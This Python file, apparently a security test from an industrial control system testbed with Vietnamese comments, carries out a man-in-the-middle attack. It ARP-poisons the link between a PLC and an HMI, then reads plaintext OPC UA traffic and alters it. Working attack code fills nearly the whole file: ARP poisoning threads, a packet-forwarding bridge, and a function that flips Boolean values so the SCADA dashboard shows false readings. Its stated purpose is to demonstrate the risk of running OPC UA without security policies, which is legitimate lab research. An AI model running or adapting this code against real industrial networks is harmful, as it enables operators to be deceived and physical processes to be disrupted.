#!/usr/bin/env python3
"""
tests/test_mitm_opcua_spoof.py
MitM Attack: ARP Poison + OPC UA Plaintext Read/Spoof
PLC (192.168.210.211:4840) <-> Attacker <-> HMI/Web-SCADA (192.168.210.31)

MITRE ATT&CK for ICS:
  - T0830 Adversary-in-the-Middle  (ky thuat: chen giua bang ARP poison)
  - T0815 Denial of View           (hau qua che do DISRUPT: HMI mat hinh tam thoi)
  - T0832 Manipulation of View     (hau qua che do SPOOF: HMI van chay nhung hien gia tri gia)

Khac voi test_mitm_s7_spoof.py (S7CommPlus, ma hoa -- khong doc duoc noi dung):
OPC UA tren testbed nay chay Anonymous/No-Security (da xac nhan qua
OPCUA_UNAUTHORIZED_SESSION va OPCUA_CERTIFICATE_REJECTED deu NOT_CONFIGURED
trong tests/day8/run_day8.py). Traffic la UA-TCP binary THUAN VAN BAN (khong
ma hoa, khong chu ky toan ven vi SecurityMode=None), nen dung o vi tri MITM
co the vua DOC duoc gia tri that vua SUA noi dung ma HMI khong phat hien --
dung diem doi lap voi S7CommPlus bi ma hoa chan lai.

============================================================================
HAI CHE DO -- dat qua bien moi truong MITM_OPCUA_MODE:
============================================================================
  MITM_OPCUA_MODE=disrupt  (mac dinh, giong lan chay dau)
    - Chi sniff + reinject ban da sua, DUA VAO IP forwarding cua OS de forward
      ban goc. => moi goi PLC->HMI di 2 lan (goc + sua) => TCP loan => HMI treo.
    - Ket qua: T0815 Denial of View (mat hinh tam thoi, tu hoi phuc).

  MITM_OPCUA_MODE=spoof   (che do spoof SACH -- muc tieu T0832)
    - Script la bo forward DUY NHAT: forward CA HAI chieu + CA MOI protocol
      (khong chi 4840, de S7comm/WinCC van song), chi sua chieu PLC->HMI 4840.
    - BAT BUOC tat IP forwarding trong che do nay (neu khong lai bi forward kep).
    - Flip Boolean giu NGUYEN do dai => TCP sequence khong lech => co co hoi
      HMI/web_scada van ket noi ma hien gia tri gia.

CANH BAO THUC TE (khong phong dai) cho che do spoof:
  scapy sniff+sendp bang Python tren Windows KHO theo kip ~2000 goi/giay. Neu
  rot goi, TCP se retransmit va van co the treo. Cong cu MITM sua-noi-dung
  nghiem tuc tren Windows dung WinDivert (pydivert) o tang kernel, khong dung
  scapy. Neu che do spoof van treo, do la gioi han cua scapy tren Windows,
  KHONG phai do khong the sua noi dung -- hay chuyen sang pydivert de kiem chung.

CANH BAO ve muc tieu byte:
manipulate_opcua_payload() dung heuristic quet tim 1 Variant Boolean dau tien
(khong phai bo phan tich day du). OPC UA khong lap lai ten tag trong response,
nen khong the tim theo ten "BangTai" bang pattern byte. modified_count>0 KHONG
dam bao dung field BangTai. Muon chinh xac: bat 1 PublishResponse that bang
Wireshark, xac dinh offset that cua BangTai, roi hardcode (giong cach
test_mitm_s7_spoof.py lam voi M5/M6/MD54 cho S7comm).

Con quan trong: OPC UA 4840 la kenh cua WEB_SCADA (opcua_gateway poll), khong
phai cua WinCC (WinCC dung S7CommPlus). Vay spoof gia tri se hien tren DASHBOARD
WEB-SCADA, khong phai tren WinCC. WinCC chi bi anh huong khi mang bi nhieu
(che do disrupt).

Yeu cau: pip install scapy, chay Admin (Windows) / sudo (Linux).

IP forwarding:
  - che do disrupt: BAT (Windows: netsh interface ipv4 set interface "Ethernet"
    forwarding=enabled ; Linux: echo 1 > /proc/sys/net/ipv4/ip_forward)
  - che do spoof:   TAT (Windows: ...forwarding=disabled ; Linux: echo 0 > ...)
    Script tu tat tren Linux; tren Windows ban phai tu tat truoc khi chay.
"""

import sys
import os
import time
import threading
from collections import deque

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from tests.common import *  # noqa: F401,F403

try:
    from scapy.all import (
        ARP, Ether, IP, TCP, Raw,
        send, sendp, srp, sniff,
        get_if_hwaddr, getmacbyip
    )
except ImportError:
    print("[!] Thieu scapy: pip install scapy")
    sys.exit(1)

# ── Config ────────────────────────────────────────────────────────────────────
PLC_IP_CONF = PLC_IP
HMI_IP_CONF = HMI_IP
OPCUA_PORT  = 4840
DURATION    = int(os.getenv("MITM_OPCUA_DURATION_S", "60"))
# "disrupt" (mac dinh) = du IP forwarding OS + reinject -> forward kep -> Denial of View.
# "spoof"             = script forward duy nhat, sua nguyen do dai -> muc tieu Manipulation of View.
MODE        = os.getenv("MITM_OPCUA_MODE", "disrupt").strip().lower()

stop_arp          = threading.Event()
intercepted_count = 0
modified_count    = 0

# Bo dem chan doan cho che do spoof (phan biet diem chet).
raw_seen_count      = 0   # tong goi sniff dua vao callback (bat ky)
has_ether_count     = 0   # goi co lop Ether + IP
victim_pair_count   = 0   # goi giua dung cap PLC<->HMI (theo IP)

# Dat trong main(), dung boi packet_callback o che do spoof (sole-forwarder).
ATTACKER_MAC = None
PLC_MAC      = None
HMI_MAC      = None

UA_MSG_TYPES = {b"HEL", b"OPN", b"MSG", b"CLO", b"ERR"}


# ── MAC helper ────────────────────────────────────────────────────────────────
def get_mac(ip):
    try:
        ans, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
            timeout=2, verbose=False
        )
        return ans[0][1].hwsrc if ans else None
    except Exception:
        return None


# ── ARP Poison (giong het test_mitm_s7_spoof.py, da co restore) ──────────────
def arp_poison(plc_mac, hmi_mac, plc_ip, hmi_ip, iface):
    attacker_mac = get_if_hwaddr(iface)

    poison_to_hmi = Ether(dst=hmi_mac) / ARP(
        op=2, pdst=hmi_ip, hwdst=hmi_mac,
        psrc=plc_ip, hwsrc=attacker_mac
    )
    poison_to_plc = Ether(dst=plc_mac) / ARP(
        op=2, pdst=plc_ip, hwdst=plc_mac,
        psrc=hmi_ip, hwsrc=attacker_mac
    )

    print(f"[ARP] Poison started: PLC={plc_ip} <-> HMI={hmi_ip}")
    while not stop_arp.is_set():
        sendp(poison_to_hmi, iface=iface, verbose=False)
        sendp(poison_to_plc, iface=iface, verbose=False)
        time.sleep(1.5)


def restore_arp(plc_mac, hmi_mac, plc_ip, hmi_ip, iface):
    fix_hmi = Ether(dst=hmi_mac) / ARP(
        op=2, pdst=hmi_ip, hwdst=hmi_mac,
        psrc=plc_ip, hwsrc=plc_mac
    )
    fix_plc = Ether(dst=plc_mac) / ARP(
        op=2, pdst=plc_ip, hwdst=plc_mac,
        psrc=hmi_ip, hwsrc=hmi_mac
    )
    for _ in range(5):
        sendp(fix_hmi, iface=iface, verbose=False)
        sendp(fix_plc, iface=iface, verbose=False)
        time.sleep(0.3)
    print("[ARP] Da khoi phuc ARP table")


# ── OPC UA UA-TCP frame decode (tu extract_opcua_features.py) ────────────────
def decode_ua_header(raw: bytes) -> dict | None:
    """MessageType(3 ascii) + ChunkType(1) + MessageSize(4 LE)."""
    if len(raw) < 8:
        return None
    msg_type = raw[0:3]
    if msg_type not in UA_MSG_TYPES:
        return None
    return {
        "type": msg_type.decode(),
        "chunk": chr(raw[3]),
        "size": int.from_bytes(raw[4:8], "little"),
    }


def find_boolean_variant(body: bytes):
    """Heuristic: OPC UA Boolean Variant = TypeId byte 0x01 followed by a
    single 0x00/0x01 value byte. NOT a full parser -- first match only,
    may or may not be the field you actually want. See module docstring."""
    for i in range(len(body) - 1):
        if body[i] == 0x01 and body[i + 1] in (0x00, 0x01):
            return i + 1
    return None


def manipulate_opcua_payload(payload: bytes) -> bytes:
    """Best-effort: flip the first Boolean Variant found in a MSG payload."""
    global modified_count
    payload = bytearray(payload)
    header = decode_ua_header(bytes(payload))
    if not header or header["type"] != "MSG":
        return bytes(payload)

    body = payload[8:]
    offset = find_boolean_variant(bytes(body))
    if offset is None:
        return bytes(payload)

    original = body[offset]
    body[offset] = 0x00 if original else 0x01
    info(f"OPC UA SPOOF: Boolean byte 0x{original:02X} -> 0x{body[offset]:02X} "
         f"(heuristic match at body offset={offset}, not guaranteed = BangTai)")
    modified_count += 1
    payload[8:] = body
    return bytes(payload)


# ── Packet Callback ───────────────────────────────────────────────────────────
def packet_callback(pkt, plc_ip, hmi_ip, iface):
    global intercepted_count

    if not pkt.haslayer(IP) or not pkt.haslayer(TCP):
        return

    src_ip = pkt[IP].src
    dst_ip = pkt[IP].dst
    sport = pkt[TCP].sport
    dport = pkt[TCP].dport

    if sport != OPCUA_PORT and dport != OPCUA_PORT:
        return

    intercepted_count += 1

    # PLC -> HMI: doc + thu sua roi forward
    if src_ip == plc_ip and dst_ip == hmi_ip and sport == OPCUA_PORT:
        if pkt.haslayer(Raw):
            raw = bytes(pkt[Raw].load)
            header = decode_ua_header(raw)
            if header:
                info(f"OPC UA {header['type']} PLC->HMI, {len(raw)}B (plaintext, decoded live)")
            modified_raw = manipulate_opcua_payload(raw)
            new_pkt = pkt.copy()
            new_pkt[Raw].load = modified_raw
            del new_pkt[IP].chksum
            del new_pkt[TCP].chksum
            hmi_mac = getmacbyip(hmi_ip)
            if hmi_mac:
                sendp(Ether(dst=hmi_mac) / new_pkt[IP], iface=iface, verbose=False)
        return  # khong fall-through

    # HMI -> PLC: forward nguyen
    if src_ip == hmi_ip and dst_ip == plc_ip:
        plc_mac = getmacbyip(plc_ip)
        if plc_mac:
            sendp(Ether(dst=plc_mac) / pkt[IP], iface=iface, verbose=False)


# Chong loop cho L3 forward: nho chu ky goi vua forward (IP.id + TCP.seq + len).
# Goi ta tu re-send ra, neu bi sniff bat lai, se trung chu ky -> bo qua.
_recent_sigs = deque(maxlen=4000)
_recent_set = set()


def _packet_sig(pkt, src_ip, dst_ip):
    ipid = pkt[IP].id
    seq = pkt[TCP].seq if pkt.haslayer(TCP) else 0
    ack = pkt[TCP].ack if pkt.haslayer(TCP) else 0
    plen = len(bytes(pkt[Raw].load)) if pkt.haslayer(Raw) else 0
    return (src_ip, dst_ip, ipid, seq, ack, plen)


def bridge_callback(pkt, plc_ip, hmi_ip, iface):
    """Che do spoof: script la bo forward DUY NHAT (IP forwarding phai TAT).

    Forward o TANG IP (L3, dung send()) chu KHONG phai L2 -- vi tren interface
    nay scapy tra ve goi khong co lop Ether (has_ether=0) va get_if_hwaddr tra
    00:00:00:00:00:00. send(IP) de OS/scapy tu resolve MAC that qua ARP cache
    cua attacker (khong bi poison chinh minh) nen van giao dung dich.

    Forward CA MOI protocol giua 2 host (khong chi 4840) de S7comm/WinCC van
    song; chi sua noi dung chieu PLC->HMI tren 4840. Flip Boolean giu nguyen
    do dai nen TCP sequence khong lech. Chong loop bang chu ky goi (khong con
    dua vao Ether.src vi khong co L2).
    """
    global intercepted_count, raw_seen_count, has_ether_count, victim_pair_count

    raw_seen_count += 1

    if not pkt.haslayer(IP):
        return
    has_ether_count += 1  # o day nghia la "co lop IP dung de forward L3"

    src_ip = pkt[IP].src
    dst_ip = pkt[IP].dst
    if {src_ip, dst_ip} != {plc_ip, hmi_ip}:
        return
    victim_pair_count += 1

    sig = _packet_sig(pkt, src_ip, dst_ip)
    if sig in _recent_set:
        return  # goi ta tu re-send bi bat lai, hoac retransmit trung -> bo qua
    _recent_set.add(sig)
    _recent_sigs.append(sig)
    if len(_recent_set) > 3800:
        _recent_set.clear()
        _recent_sigs.clear()

    intercepted_count += 1

    is_opcua_plc_to_hmi = (
        src_ip == plc_ip and dst_ip == hmi_ip
        and pkt.haslayer(TCP) and pkt[TCP].sport == OPCUA_PORT
        and pkt.haslayer(Raw)
    )
    if is_opcua_plc_to_hmi:
        raw = bytes(pkt[Raw].load)
        header = decode_ua_header(raw)
        if header:
            info(f"OPC UA {header['type']} PLC->HMI, {len(raw)}B (plaintext, decoded live)")
        new_pkt = pkt[IP].copy()
        new_pkt[Raw].load = manipulate_opcua_payload(raw)  # giu nguyen do dai
        del new_pkt.chksum
        if new_pkt.haslayer(TCP):
            del new_pkt[TCP].chksum
        send(new_pkt, iface=iface, verbose=False)
    else:
        send(pkt[IP], iface=iface, verbose=False)


# ── Main ──────────────────────────────────────────────────────────────────────
def main():
    global intercepted_count, modified_count, ATTACKER_MAC, PLC_MAC, HMI_MAC
    global raw_seen_count, has_ether_count, victim_pair_count
    intercepted_count = 0
    modified_count = 0
    raw_seen_count = 0
    has_ether_count = 0
    victim_pair_count = 0

    plc_ip = PLC_IP_CONF
    hmi_ip = HMI_IP_CONF
    iface = IFACE
    spoof_mode = (MODE == "spoof")

    print(f"\n{B}[TEST] MITM OPCUA PLAINTEXT SPOOF — Bang truyen AGF{X}")
    info(f"PLC: {plc_ip}:{OPCUA_PORT}  HMI: {hmi_ip}  Duration: {DURATION}s  MODE: {MODE}")
    info("Doi lap voi test_mitm_s7_spoof.py: OPC UA khong ma hoa (Anonymous/No-Security)")
    if spoof_mode:
        info("SPOOF mode: script la bo forward duy nhat -- IP forwarding PHAI TAT.")
    else:
        info("DISRUPT mode (mac dinh): dua vao IP forwarding OS -- ket qua Denial of View.")

    changes = []
    observable = []
    notes = []
    error = None
    t0 = time.time()

    plc_mac = None
    hmi_mac = None

    try:
        info("Lay MAC address...")
        plc_mac = get_mac(plc_ip)
        hmi_mac = get_mac(hmi_ip)

        if not plc_mac:
            error = f"PLC {plc_ip} unreachable (no ARP reply)"
            fail(error)
            print_result("MITM_OPCUA_SPOOF", False, [], [], [error], time.time() - t0, error)
            return

        if not hmi_mac:
            error = f"HMI {hmi_ip} unreachable (no ARP reply)"
            fail(error)
            print_result("MITM_OPCUA_SPOOF", False, [], [], [error], time.time() - t0, error)
            return

        ok(f"PLC MAC : {plc_mac}")
        ok(f"HMI MAC : {hmi_mac}")

        ATTACKER_MAC = get_if_hwaddr(iface)
        PLC_MAC = plc_mac
        HMI_MAC = hmi_mac
        info(f"ATTACKER_MAC={ATTACKER_MAC}  (guard so khop Ether.src voi PLC/HMI MAC o tren)")

        if spoof_mode:
            # Sole-forwarder: IP forwarding cua OS PHAI TAT (neu khong -> forward kep).
            if sys.platform.startswith("linux"):
                os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
                info("IP forwarding: OFF (spoof mode, script tu forward)")
            else:
                warn('Windows SPOOF mode: xac nhan da chay "netsh interface ipv4 set interface ... forwarding=disabled" TRUOC lenh nay')
        else:
            if sys.platform.startswith("linux"):
                os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
                info("IP forwarding: ON")
            else:
                warn('Windows DISRUPT mode: xac nhan da chay "netsh interface ipv4 set interface ... forwarding=enabled" TRUOC lenh nay')

        arp_thread = threading.Thread(
            target=arp_poison,
            args=(plc_mac, hmi_mac, plc_ip, hmi_ip, iface),
            daemon=True
        )
        arp_thread.start()
        ok("ARP Poison thread started")
        time.sleep(2)

        if spoof_mode:
            # Bat ca moi traffic giua 2 host de forward duy nhat, sua rieng 4840.
            filter_str = f"host {plc_ip} and host {hmi_ip}"
            cb = bridge_callback
        else:
            filter_str = f"tcp port {OPCUA_PORT}"
            cb = packet_callback
        info(f"Sniffing [{filter_str}] for {DURATION}s ...")
        info("Wireshark filter: opcua || arp.duplicate-address-frame")

        sniff(
            filter=filter_str,
            prn=lambda pkt: cb(pkt, plc_ip, hmi_ip, iface),
            timeout=DURATION,
            store=False,
            iface=iface
        )

    except KeyboardInterrupt:
        info("Dung boi user (Ctrl+C)")
    except Exception as e:
        error = str(e)
        fail(str(e))
    finally:
        stop_arp.set()
        time.sleep(1)
        if plc_mac and hmi_mac:
            try:
                restore_arp(plc_mac, hmi_mac, plc_ip, hmi_ip, iface)
            except Exception as e:
                warn(f"Restore ARP failed: {e}")
        if sys.platform.startswith("linux"):
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            info("IP forwarding: OFF")

    duration = time.time() - t0

    observable.append(f"ARP Poison: PLC {plc_ip} <-> HMI {hmi_ip} qua attacker")
    observable.append(f"OPC UA intercepted: {intercepted_count} pkts")
    observable.append(f"OPC UA modified   : {modified_count} pkts")

    changes.append("Boolean Variant flip (heuristic, best-effort) trong 1 frame MSG PLC->HMI")

    notes.append(f"MODE       : {MODE}")
    notes.append("MITRE      : T0830 Adversary-in-the-Middle + " +
                 ("T0832 Manipulation of View (muc tieu spoof)" if spoof_mode
                  else "T0815 Denial of View (disrupt)"))
    notes.append(f"Duration   : {duration:.1f}s")
    notes.append(f"Intercepted: {intercepted_count} | Modified: {modified_count}")
    notes.append("Wireshark  : opcua || arp.duplicate-address-frame")
    if spoof_mode:
        notes.append(
            f"DIAG counters (L3 forward): raw_seen={raw_seen_count} has_ip={has_ether_count} "
            f"victim_pair={victim_pair_count} forwarded={intercepted_count}"
        )
        if raw_seen_count == 0:
            notes.append("CHET TANG 1: sniff khong thay goi nao -- sai IFACE hoac Npcap khong ap filter.")
        elif victim_pair_count == 0:
            notes.append("CHET TANG 2: co goi nhung khong dung cap IP PLC<->HMI -- ARP poison chua chuyen huong duoc.")
        elif intercepted_count == 0:
            notes.append("CHET TANG 3: co goi dung cap nhung deu trung chu ky dedup -- bao lai de xem lai logic dedup.")
        else:
            notes.append(f"L3 forward hoat dong: {intercepted_count} goi da forward, {modified_count} goi OPC UA da sua.")
        notes.append(
            "SPOOF mode: neu web_scada VAN KET NOI ma dashboard hien gia tri sai -> T0832 dat. "
            "Neu web_scada rot/treo -> scapy tren Windows khong theo kip tang goi; chuyen sang "
            "pydivert/WinDivert de kiem chung (gioi han thu vien, KHONG phai khong the sua noi dung)."
        )
    else:
        notes.append(
            "DISRUPT mode: forward kep (OS + reinject) lam TCP loan -> HMI treo tam thoi (T0815), "
            "tu hoi phuc sau khi restore ARP. Muon spoof SACH: chay lai voi MITM_OPCUA_MODE=spoof "
            "va TAT IP forwarding."
        )
    notes.append(
        "modified_count>0 khong dam bao dung field BangTai (heuristic Boolean dau tien) -- xem docstring. "
        "OPC UA 4840 la kenh web_scada, KHONG phai WinCC (S7CommPlus): spoof hien tren dashboard web-scada."
    )
    notes.append(
        "So sanh voi test_mitm_s7_spoof.py: doc duoc plaintext de dang o day trong khi ban S7CommPlus "
        "chi thay hex tho -> bang chung truc tiep khong bat security policy OPC UA nguy hiem hon S7CommPlus ma hoa."
    )

    success = intercepted_count > 0
    print_result("MITM_OPCUA_SPOOF", success, changes, observable, notes, duration, error)


if __name__ == "__main__":
    main()
